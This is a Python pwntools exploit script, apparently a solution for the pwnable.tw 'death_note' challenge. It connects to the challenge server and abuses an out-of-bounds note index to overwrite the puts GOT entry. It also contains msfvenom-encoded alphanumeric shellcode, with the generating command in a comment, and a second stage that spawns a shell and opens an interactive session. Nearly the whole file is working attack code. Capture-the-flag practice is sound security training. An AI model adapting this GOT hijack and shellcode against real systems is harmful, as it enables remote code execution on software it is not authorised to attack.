#!/usr/bin/env python3
import re
from pwn import *
import pwnlib.shellcraft

c = remote('chall.pwnable.tw', 10201)
# c = process('./death_note')
elf = ELF('./death_note')

context.os='linux'
# need Ubuntu 18.04.2 LTS
# using tmux to run
context.terminal = ['tmux', 'splitw', '-h']

gdbcmd = '''source /usr/share/peda/peda.py
# mov    eax,DWORD PTR [eax*4+0x804a060]
b *0x80488cd
#  <add_note+145>: mov DWORD PTR [eax*4+0x804a060],edx
b *0x80487e0

#  CALL read_int undefined read_int()
# b *0x80488a2

rwatch *0x804a040
telescope 0x804a040
c
p ($eax*4+0x804a060)
'''

# gdb.attach(c, gdbcmd)
context.log_level ='debug'

bss = 0x804a040


def send_menu(command):
    c.recvuntil(':')
    c.sendline(command)

memory_base_offset = -1107372056 # Absolute Address: 0x0

def read_mem(address):
    send_menu(b'2')
    send_menu(str(int(memory_base_offset + address / 4)))

def free_mem(address):
    send_menu(b'3')
    send_menu(str(int(memory_base_offset + address / 4)))

def write_mem(address, data):
    send_menu(b'1')
    send_menu(str(int(memory_base_offset + address / 4)))
    send_menu(data)


""" old
#read_mem(bss)
write_mem(bss, '1')
read_mem(0x80485c9) # read bss
#     080485c8 68 40 a0        PUSH       stdin 04 08

write_mem(bss + 4, '1')
read_mem(bss + 4)

free_mem(bss + 4)
free_mem(bss)
free_mem(bss + 4)
"""


# asm(shellcraft.read(buf='edx', nbytes=0x200))
# echo -n '1\xdb\x89\xd11\xd2\xb6\x02j\x03X\xcd\x80' | msfvenom -a x86 --platform linux -p - -e x86/alpha_mixed BufferRegister=EDX -f python --smallest
buf =  b""
buf += b"\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
buf += b"\x4a\x4a\x4a\x4a\x37\x52\x59\x6a\x41\x58\x50\x30\x41"
buf += b"\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
buf += b"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x46"
buf += b"\x51\x69\x4b\x6e\x69\x7a\x71\x36\x51\x48\x52\x78\x36"
buf += b"\x53\x32\x30\x6a\x73\x33\x72\x78\x38\x4d\x6b\x30\x41"
buf += b"\x41"

# hijack got
write_mem(elf.got['puts'], buf)

c.recvn(0)
sh = asm(shellcraft.sh())
c.send(b'A' * 100 + sh) # 'A' like nop slide

c.interactive()
c.close()
